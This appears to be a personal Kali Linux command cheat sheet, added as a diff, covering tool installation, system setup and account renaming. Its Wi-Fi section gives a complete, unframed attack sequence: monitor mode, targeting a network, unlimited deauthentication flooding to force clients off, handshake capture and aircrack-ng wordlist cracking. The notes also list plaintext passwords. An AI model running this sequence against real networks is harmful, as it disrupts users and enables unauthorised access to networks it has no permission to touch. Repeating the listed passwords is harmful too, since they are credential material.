@@ -1,0 +1,129 @@
+apt install legion -y
+If you prefer traditional method of installation type these commands:
+git clone https://github.com/GoVanguard/legion.git
+cd legion
+sudo chmod +x startLegion.sh
+sudo ./startLegion.sh
+
+https://www.youtube.com/watch?v=owEVhvbZMkk
+
+--------------------------------------------------------------------------------------------
+
+bluetooth - 
+
+hciconfig 
+
+(if down use - service bluetooth start)
+--------------------------------------------------------------------------------------------
+
+Wifi handshake -
+
+iwconfig
+
+sudo airmon-ng check kill
+
+sudo airmon-ng start wlan0
+
+ifconfig
+
+sudo airodump-ng wlan0mon 
+
+sudo airodump-ng wlan0mon -d __bssid?__
+
+cd desktop
+sudo airodump-ng -w hack1 -c __ch?__ --bssid __bssid?__ wlan0mon
+
+sudo aireplay-ng --deauth 0 -a __bssid?__ wlan0mon
+
+ls
+
+wireshark hack1-01.cap
+
+search - eapol
+
+close wireshark
+
+aircrack-ng hack1-01.cap -w /home/kali/Desktop/storm/10worldlist.txt
+
+sudo airmon-ng stop wlan0mon
+iwconfig
+
+--------------------------------------------------------------------------------------------
+
+Things install in kali after installation 
+
+passwd - Storm2023
+passwd - Storm@123
+
+sudo apt-cache search kali-linux
+apt install kali-linux-everything
+
+sudo apt update 
+
+apt-get dist-upgrade
+
+sudo apt upgrade
+
+sudo dpkg —configure -a
+ 
+neofetch
+
+apt-get install git 
+
+sudo apt install tilix 
+
+sudo apt install htop 
+
+sudo apt install python 
+
+sudo apt install default-jdk 
+
+sudo apt install vlc 
+
+sudo apt-get install gdebi -y
+
+sudo apt-get -y install xarchiver
+
+Vscode- https://code.visualstudio.com/download  
+cd downloads/ 
+sudo apt install ./(vscode installer)
+
+Libre office - https://www.youtube.com/watch?v=9pAqNs5pKJA
+
+TOR - sudo apt install -y tor torbrowser-launcher
+ torbrowser-launcher
+
+Exit editor - Esc :q!
+--------------------------------------------------------------------------------------------
+
+The following packages have been kept back in upgrade -
+
+cd desktop
+nano upgrade.sh
+
+List="A B C D"
+for x in $List; do
+apt-get install $x -y
+done
+
+ctrl+o+enter 
+ctrl+x+enter
+
+chmod +x upgrade.sh
+sudo ./upgrade.sh
+--------------------------------------------------------------------------------------------
+
+sudo usermod -l Hitesh -d /home/Hitesh -m parallels
+sudo groupmod -n Hitesh parallels   
+sudo ln -s /home/Hitesh /home/parallels
+sudo chfn -f "Hitesh" Hitesh  
+
+
+--------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
